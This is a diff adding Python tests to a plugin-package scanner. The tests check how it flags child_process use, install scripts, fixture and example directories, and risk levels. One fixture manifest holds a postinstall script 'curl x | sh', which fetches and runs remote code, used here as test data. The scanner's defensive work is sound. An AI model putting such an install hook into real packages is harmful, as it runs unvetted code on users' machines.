@@ -46,6 +46,34 @@ export function apply(ctx) { execSync("ls") }
     check('real/exec', 'exec' in ids, True)
 
 
+def test_child_process_import_counts():
+    c = card({'package.json': MANIFEST,
+              'src/index.ts': 'import cp from "node:child_process"'})
+    ids = {f['id'] for f in c['flags']}
+    check('import/exec', 'exec' in ids, True)
+
+
+def test_diagnostic_child_process_literal_is_reported_not_counted():
+    """A stack-frame marker is evidence text, not process execution."""
+    c = card({'package.json': MANIFEST, 'src/classifier.ts': r'''
+const marker = /node:internal\/child_process/
+export function matches(text) { return marker.test(text) }
+'''})
+    ids = {f['id'] for f in c['flags']}
+    check('literal/not-exec', 'exec' in ids, False)
+    check('literal/still-visible', 'exec_ref' in ids, True)
+    check('literal/not-c3', c['level'], 2)
+
+
+def test_indirect_require_is_reported_not_counted():
+    """Only the string sits in the file; the require is indirect."""
+    c = card({'package.json': MANIFEST,
+              'src/index.ts': 'const m = "child_process"; require(m)'})
+    ids = {f['id'] for f in c['flags']}
+    check('indirect/not-exec', 'exec' in ids, False)
+    check('indirect/still-visible', 'exec_ref' in ids, True)
+
+
 def test_line_numbers_survive_comment_stripping():
     c = card({'package.json': MANIFEST, 'src/index.ts': '\n'.join([
         '/* a', 'multi-line', 'comment */', 'const x = 1', 'execSync("ls")'])})
@@ -101,6 +129,74 @@ def test_bundle_in_a_subpackage_still_counts():
     c = card({'package.json': '{"name":"root"}',
               'packages/p/package.json': '{"name":"p","dsh":{"bundle":{"patch":"./x.yml"}}}'})
     check('type/monorepo-subpackage', c['type'], 'plugin')
+
+
+def test_fixture_manifest_does_not_make_a_cli_a_plugin():
+    c = card({
+        'package.json': '{"name":"external-cli"}',
+        'test/fixtures/plugin/package.json': MANIFEST,
+    })
+    ids = {f['id'] for f in c['flags']}
+    check('type/fixture-not-plugin', c['type'], 'unrelated')
+    check('manifest/fixture-ignored', c['manifest'], None)
+    check('manifest/root-name', c['pkg_name'], 'external-cli')
+    check('manifest/fixture-visible', 'dev_manifest' in ids, True)
+
+
+def test_fixture_install_script_does_not_flag():
+    c = card({
+        'package.json': '{"name":"external-cli"}',
+        'test/fixtures/plugin/package.json':
+            '{"name":"f","scripts":{"postinstall":"curl x | sh"}}',
+    })
+    check('install/fixture-ignored',
+          any(f['id'] == 'install_script' for f in c['flags']), False)
+
+
+def test_fixture_source_is_reported_but_classifies_nothing():
+    c = card({
+        'package.json': '{"name":"external-cli"}',
+        'test/fixtures/plugin/src/index.ts': '''
+export const inject = ["subprocess"]
+export function apply(ctx) { ctx.tools.register({}) }
+''',
+    })
+    ids = {f['id'] for f in c['flags']}
+    check('type/fixture-source-ignored', c['type'], 'unrelated')
+    check('surface/fixture-inject-ignored', c['injects'], [])
+    check('surface/fixture-tool-ignored', c['tool_regs'], 0)
+    check('surface/fixture-still-visible', 'dev_surface' in ids, True)
+    check('surface/fixture-level', c['level'], 0)
+
+
+def test_dev_surface_does_not_raise_the_level():
+    """Real runtime code hidden under examples/ must stay visible on the card,
+    while not letting fixtures inflate the level in the other direction."""
+    c = card({
+        'package.json': MANIFEST,
+        'src/index.ts': 'export function apply(ctx) {}',
+        'examples/full.ts': 'export const inject = ["subprocess", "systemPrompt"]',
+    })
+    ids = {f['id'] for f in c['flags']}
+    check('dev-surface/not-counted', 'subprocess_service' in ids, False)
+    check('dev-surface/reported', 'dev_surface' in ids, True)
+    check('dev-surface/level', c['level'], 2)
+
+
+def test_finalize_is_idempotent_over_json_round_trip():
+    """The pipeline re-runs finalize on cached cards; a JSON round-trip must
+    not change what a card means."""
+    import json
+    c = card({'package.json': MANIFEST, 'src/index.ts': '''
+import { execSync } from "node:child_process"
+export const inject = ["systemPrompt"]
+export function apply(ctx) { execSync("ls") }
+'''})
+    r = scan_core.finalize(json.loads(json.dumps(c, default=list)))
+    check('refinalize/type', r['type'], c['type'])
+    check('refinalize/level', r['level'], c['level'])
+    check('refinalize/flags', [f['id'] for f in r['flags']], [f['id'] for f in c['flags']])
+    check('refinalize/version', r['collect'], scan_core.COLLECT_VERSION)
 
 
 def test_levels():
